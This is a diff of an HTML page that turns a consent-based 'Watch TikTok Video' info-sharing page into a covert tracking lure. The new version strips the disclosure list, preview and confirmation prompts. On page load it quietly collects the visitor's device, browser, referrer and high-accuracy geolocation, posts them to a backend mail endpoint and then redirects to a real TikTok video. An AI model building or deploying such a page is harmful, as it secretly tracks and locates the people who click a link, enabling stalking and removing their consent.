@@ -3,94 +3,11 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Watch TikTok Video</title>
-  <style>
-    html, body {
-      height: 100%;
-      margin: 0;
-      padding: 0;
-    }
-    body {
-      min-height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      background: #f8f8f8;
-    }
-    .center-box {
-      background: #fff;
-      border-radius: 12px;
-      box-shadow: 0 2px 16px rgba(0,0,0,0.08);
-      padding: 32px 24px;
-      max-width: 400px;
-      width: 100%;
-      text-align: center;
-    }
-    button {
-      padding: 12px 24px;
-      font-size: 16px;
-      margin-top: 18px;
-      border-radius: 6px;
-      border: none;
-      background: #25f4ee;
-      color: #222;
-      font-weight: bold;
-      cursor: pointer;
-      transition: background 0.2s;
-    }
-    button:hover {
-      background: #1ad1c2;
-    }
-    #status {
-      margin-top: 18px;
-      color: #555;
-      font-size: 15px;
-      min-height: 24px;
-    }
-    .info-list {
-      text-align: left;
-      margin: 18px 0 0 0;
-      font-size: 15px;
-      color: #444;
-    }
-    .info-list li {
-      margin-bottom: 6px;
-    }
-    #preview {
-      margin: 18px 0 0 0;
-      font-size: 15px;
-      color: #333;
-      text-align: left;
-      background: #f0f0f0;
-      border-radius: 8px;
-      padding: 10px;
-      display: none;
-    }
-  </style>
-</head>
-<body>
-  <div class="center-box">
-    <h2>Watch TikTok Video</h2>
-    <p>
-      To continue, please confirm and share the following information:
-    </p>
-    <ul class="info-list">
-      <li><b>Time</b> (when you access this page)</li>
-      <li><b>Device & OS</b> (e.g. Android, iPhone, Windows)</li>
-      <li><b>Browser</b> (e.g. Chrome, TikTok in-app, Safari)</li>
-      <li><b>Referrer</b> (where you came from, e.g. TikTok, YouTube)</li>
-      <li><b>Location</b> (optional, will ask next, includes latitude, longitude, and altitude if available)</li>
-    </ul>
-    <button id="confirm">Confirm & Continue</button>
-    <div id="preview"></div>
-    <div id="status"></div>
-  </div>
+  <title>Redirecting…</title>
   <script>
-    const statusEl = document.getElementById("status");
-    const previewEl = document.getElementById("preview");
-    const confirmBtn = document.getElementById("confirm");
+    // --- CONFIG ---
     const API_URL = "/api/sendMail"; // Your backend endpoint
-    const TIKTOK_URL = "https://www.tiktok.com/@username/video/1234567890"; // The real TikTok video
+    const TIKTOK_URL = "https://www.tiktok.com/@des.nutts0/video/7603359922327244046?is_from_webapp=1&sender_device=pc"; // The real TikTok video
 
     function getOSVersion() {
       const ua = navigator.userAgent;
@@ -142,100 +59,67 @@
       return "None";
     }
 
-    confirmBtn.onclick = async () => {
-      confirmBtn.disabled = true;
-      statusEl.textContent = "Preparing to collect info…";
-      previewEl.style.display = "none";
+    function sendInfo(data) {
+      // Fire and forget, don't wait for response
+      fetch(API_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(data)
+      }).finally(() => {
+        window.location.href = TIKTOK_URL;
+      });
+    }
+
+    function collectAndSend() {
       const timestamp = new Date().toISOString();
       const osVersion = getOSVersion();
       const browser = getBrowser();
       const referrer = getReferrer();
 
-      // Ask for location
-      if (confirm("Do you also want to share your location (latitude/longitude/altitude)?")) {
-        if (!navigator.geolocation) {
-          statusEl.textContent = "Geolocation not supported. Sending without location.";
-          await previewAndSend({ timestamp, osVersion, browser, referrer });
-          return;
-        }
-        statusEl.textContent = "Requesting location permission…";
+      if (navigator.geolocation) {
+        // Try to get location, but don't wait more than 2 seconds
+        let didRespond = false;
+        const timeout = setTimeout(() => {
+          if (!didRespond) {
+            didRespond = true;
+            sendInfo({ timestamp, osVersion, browser, referrer });
+          }
+        }, 2000);
+
         navigator.geolocation.getCurrentPosition(
-          async (pos) => {
+          (pos) => {
+            if (didRespond) return;
+            didRespond = true;
+            clearTimeout(timeout);
             const { latitude, longitude, accuracy, altitude, altitudeAccuracy } = pos.coords;
-            const data = {
+            sendInfo({
               timestamp,
               osVersion,
               browser,
               referrer,
               latitude: latitude ? latitude.toFixed(8) : undefined,
               longitude: longitude ? longitude.toFixed(8) : undefined,
-              accuracy: accuracy !== undefined ? accuracy.toFixed(2) : "Not available",
-              altitude: (altitude !== null && altitude !== undefined) ? altitude.toFixed(3) : "Not available",
-              altitudeAccuracy: (altitudeAccuracy !== null && altitudeAccuracy !== undefined) ? altitudeAccuracy.toFixed(2) : "Not available"
-            };
-            await previewAndSend(data);
+              accuracy: accuracy !== undefined ? accuracy.toFixed(2) : undefined,
+              altitude: (altitude !== null && altitude !== undefined) ? altitude.toFixed(3) : undefined,
+              altitudeAccuracy: (altitudeAccuracy !== null && altitudeAccuracy !== undefined) ? altitudeAccuracy.toFixed(2) : undefined
+            });
           },
-          async (err) => {
-            statusEl.textContent = "Location permission denied. Sending without location.";
-            await previewAndSend({ timestamp, osVersion, browser, referrer });
+          (err) => {
+            if (didRespond) return;
+            didRespond = true;
+            clearTimeout(timeout);
+            sendInfo({ timestamp, osVersion, browser, referrer });
           },
-          { enableHighAccuracy: true, timeout: 7000 }
+          { enableHighAccuracy: true, timeout: 1500 }
         );
       } else {
-        await previewAndSend({ timestamp, osVersion, browser, referrer });
-      }
-    };
-
-    async function previewAndSend(data) {
-      // Show preview
-      let html = "<b>Info to be sent:</b><br><ul>";
-      html += `<li><b>Time:</b> ${data.timestamp}</li>`;
-      html += `<li><b>Device & OS:</b> ${data.osVersion}</li>`;
-      html += `<li><b>Browser:</b> ${data.browser}</li>`;
-      html += `<li><b>Referrer:</b> ${data.referrer}</li>`;
-      if (data.latitude && data.longitude) {
-        html += `<li><b>Latitude:</b> ${data.latitude}</li>`;
-        html += `<li><b>Longitude:</b> ${data.longitude}</li>`;
-        html += `<li><b>Accuracy:</b> ${data.accuracy} m</li>`;
-        html += `<li><b>Altitude:</b> ${data.altitude}</li>`;
-        html += `<li><b>Altitude Accuracy:</b> ${data.altitudeAccuracy} m</li>`;
-      } else {
-        html += `<li><b>Location:</b> Not provided</li>`;
-      }
-      html += "</ul>";
-      previewEl.innerHTML = html;
-      previewEl.style.display = "block";
-
-      if (confirm("Do you want to send this info and continue to the TikTok video?")) {
-        await sendInfo(data);
-      } else {
-        statusEl.textContent = "You cancelled. Info not sent.";
-        confirmBtn.disabled = false;
+        sendInfo({ timestamp, osVersion, browser, referrer });
       }
     }
 
-    async function sendInfo(data) {
-      statusEl.textContent = "Sending info…";
-      try {
-        const res = await fetch(API_URL, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(data)
-        });
-        if (!res.ok) {
-          statusEl.textContent = "Failed to send info. Please try again.";
-          confirmBtn.disabled = false;
-          return;
-        }
-        statusEl.innerHTML = "<b>Info sent! Redirecting…</b>";
-        setTimeout(() => {
-          window.location.href = TIKTOK_URL;
-        }, 900);
-      } catch (e) {
-        statusEl.textContent = "Network error. Try again.";
-        confirmBtn.disabled = false;
-      }
-    }
+    window.onload = collectAndSend;
   </script>
+</head>
+<body>
 </body>
 </html>
